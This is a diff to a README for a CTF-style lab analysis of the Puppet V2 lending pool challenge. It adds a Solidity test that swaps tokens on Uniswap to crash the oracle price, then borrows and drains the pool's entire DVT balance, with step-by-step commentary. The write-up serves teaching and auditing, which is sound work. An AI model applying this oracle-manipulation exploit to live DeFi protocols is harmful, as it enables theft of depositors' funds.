@@ -44,6 +44,50 @@ This repository contains an in-depth security analysis of the **Puppet V2** lend
 
 ---
 
+## Exploit Code Walkthrough
+```solidity
+function test_puppetV2() public checkSolvedByPlayer {
+    // 1. Manipulate price: swap all DVT → WETH on Uniswap
+    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+    address[] memory path = new address[](2);
+    path[0] = address(token);
+    path[1] = address(weth);
+    uniswapV2Router.swapExactTokensForTokens(
+        PLAYER_INITIAL_TOKEN_BALANCE,
+        0,
+        path,
+        player,
+        block.timestamp
+    );
+
+    // 2. Wrap remaining ETH into WETH under the player's context
+    weth.deposit{ value: player.balance }();
+
+    // 3. Calculate required WETH collateral and approve it
+    uint256 required = lendingPool.calculateDepositOfWETHRequired(
+        POOL_INITIAL_TOKEN_BALANCE
+    );
+    weth.approve(address(lendingPool), required);
+
+    // 4. Borrow the entire DVT pool with manipulated collateral
+    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+    // 5. Transfer all drained DVT to the recovery account
+    token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+}
+```
+Step 1: Approve and swap the full DVT balance, skewing Uniswap reserves and collapsing the DVT price.
+
+Step 2: Deposit the attacker’s ETH into WETH to satisfy the artificially low collateral requirement.
+
+Step 3: Query the manipulated price, compute the minimal WETH deposit, and approve it.
+
+Step 4: Borrow all DVT from the pool at negligible cost.
+
+Step 5: Forward the stolen tokens to recovery, fulfilling the success assertion.
+
+---
+
 ## Exploit Summary
 
 Under a single transaction, the attacker:
